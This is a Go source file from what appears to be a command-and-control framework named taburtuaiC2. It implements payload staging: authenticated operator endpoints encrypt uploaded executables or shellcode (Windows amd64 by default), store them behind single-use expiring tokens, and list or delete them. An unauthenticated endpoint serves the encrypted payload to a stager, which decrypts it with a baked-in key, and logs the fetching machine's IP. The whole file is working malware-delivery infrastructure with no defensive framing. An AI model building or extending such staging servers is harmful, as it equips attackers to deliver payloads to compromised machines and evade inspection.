package api

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/mjopsec/taburtuaiC2/internal/storage"
)

// ── helpers ───────────────────────────────────────────────────────────────────

// stageEncrypt encrypts plaintext with AES-256-GCM.
// Output format: nonce(12) | ciphertext  (raw bytes, no base64)
func stageEncrypt(encKey string, plaintext []byte) ([]byte, error) {
	k := sha256.Sum256([]byte(encKey))
	block, err := aes.NewCipher(k[:])
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func newStageToken() string {
	b := make([]byte, 16)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

// ── operator-facing endpoints (auth required) ─────────────────────────────────

// CreateStage encrypts a payload and stores it for staged delivery.
// POST /api/v1/stage
// Body: { "payload_b64":"...", "format":"exe|shellcode", "arch":"amd64", "os":"windows", "ttl_hours":24, "description":"..." }
func (h *Handlers) CreateStage(c *gin.Context) {
	var req struct {
		PayloadB64  string `json:"payload_b64"  binding:"required"`
		Format      string `json:"format"`
		Arch        string `json:"arch"`
		OSTarget    string `json:"os"`
		TTLHours    int    `json:"ttl_hours"`
		Description string `json:"description"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}

	payload, err := base64.StdEncoding.DecodeString(req.PayloadB64)
	if err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid base64 payload")
		return
	}
	if len(payload) == 0 {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Empty payload")
		return
	}
	if len(payload) > 50*1024*1024 {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Payload too large (max 50 MB)")
		return
	}

	encrypted, err := stageEncrypt(h.server.Config.EncryptionKey, payload)
	if err != nil {
		c.Status(http.StatusInternalServerError)
		h.APIResponse(c, false, "", nil, "Encryption failed")
		return
	}

	if req.Format == "" {
		req.Format = "exe"
	}
	if req.Arch == "" {
		req.Arch = "amd64"
	}
	if req.OSTarget == "" {
		req.OSTarget = "windows"
	}

	var expiresAt int64
	if req.TTLHours > 0 {
		expiresAt = time.Now().Add(time.Duration(req.TTLHours) * time.Hour).Unix()
	}

	token := newStageToken()
	row := storage.StageRow{
		Token:       token,
		Payload:     encrypted,
		Format:      req.Format,
		Arch:        req.Arch,
		OSTarget:    req.OSTarget,
		CreatedAt:   time.Now().Unix(),
		ExpiresAt:   expiresAt,
		Description: req.Description,
	}
	if err := h.server.Store.InsertStage(row); err != nil {
		c.Status(http.StatusInternalServerError)
		h.APIResponse(c, false, "", nil, "Failed to store stage: "+err.Error())
		return
	}

	proto := "http"
	if c.Request.TLS != nil {
		proto = "https"
	}
	stageURL := fmt.Sprintf("%s://%s/stage/%s", proto, c.Request.Host, token)

	h.APIResponse(c, true, "Stage created", map[string]interface{}{
		"token":       token,
		"stage_url":   stageURL,
		"format":      req.Format,
		"arch":        req.Arch,
		"os":          req.OSTarget,
		"size_bytes":  len(payload),
		"expires_at":  expiresAt,
		"description": req.Description,
	}, "")
}

// ListStages returns all staged payloads (without the payload bytes).
// GET /api/v1/stages
func (h *Handlers) ListStages(c *gin.Context) {
	rows, err := h.server.Store.ListStages()
	if err != nil {
		c.Status(http.StatusInternalServerError)
		h.APIResponse(c, false, "", nil, "Database error: "+err.Error())
		return
	}

	stages := make([]map[string]interface{}, 0, len(rows))
	for _, r := range rows {
		m := map[string]interface{}{
			"token":       r.Token,
			"format":      r.Format,
			"arch":        r.Arch,
			"os":          r.OSTarget,
			"description": r.Description,
			"used":        r.Used == 1,
			"created_at":  time.Unix(r.CreatedAt, 0).Format(time.RFC3339),
		}
		if r.ExpiresAt > 0 {
			m["expires_at"] = time.Unix(r.ExpiresAt, 0).Format(time.RFC3339)
		}
		if r.Used == 1 {
			m["used_at"] = time.Unix(r.UsedAt, 0).Format(time.RFC3339)
			m["used_by_ip"] = r.UsedByIP
		}
		stages = append(stages, m)
	}

	h.APIResponse(c, true, "", map[string]interface{}{
		"stages": stages,
		"count":  len(stages),
	}, "")
}

// DeleteStage removes a staged payload.
// DELETE /api/v1/stage/:token
func (h *Handlers) DeleteStage(c *gin.Context) {
	token := c.Param("token")
	if token == "" {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Token required")
		return
	}
	if err := h.server.Store.DeleteStage(token); err != nil {
		c.Status(http.StatusInternalServerError)
		h.APIResponse(c, false, "", nil, "Delete failed: "+err.Error())
		return
	}
	h.APIResponse(c, true, "Stage deleted", nil, "")
}

// ── stager-facing endpoint (no auth — token IS the credential) ───────────────

// ServeStage delivers the encrypted payload to the stager.
// GET /stage/:token
// The stager decrypts the payload using its baked-in key.
// By default the stage is single-use (burned after first fetch).
func (h *Handlers) ServeStage(c *gin.Context) {
	token := c.Param("token")
	if token == "" {
		c.Status(http.StatusNotFound)
		return
	}

	row, found, err := h.server.Store.GetStage(token)
	if err != nil || !found {
		c.Status(http.StatusNotFound)
		return
	}

	// Check expiry
	if row.ExpiresAt > 0 && time.Now().Unix() > row.ExpiresAt {
		_ = h.server.Store.DeleteStage(token)
		c.Status(http.StatusGone)
		return
	}

	// Mark used (one-shot by default)
	_ = h.server.Store.MarkStageUsed(token, c.ClientIP())

	h.server.Logger.Info("STAGE", fmt.Sprintf("Stage served token=%s ip=%s format=%s",
		token, c.ClientIP(), row.Format), "", "", nil)

	c.Data(http.StatusOK, "application/octet-stream", row.Payload)
}
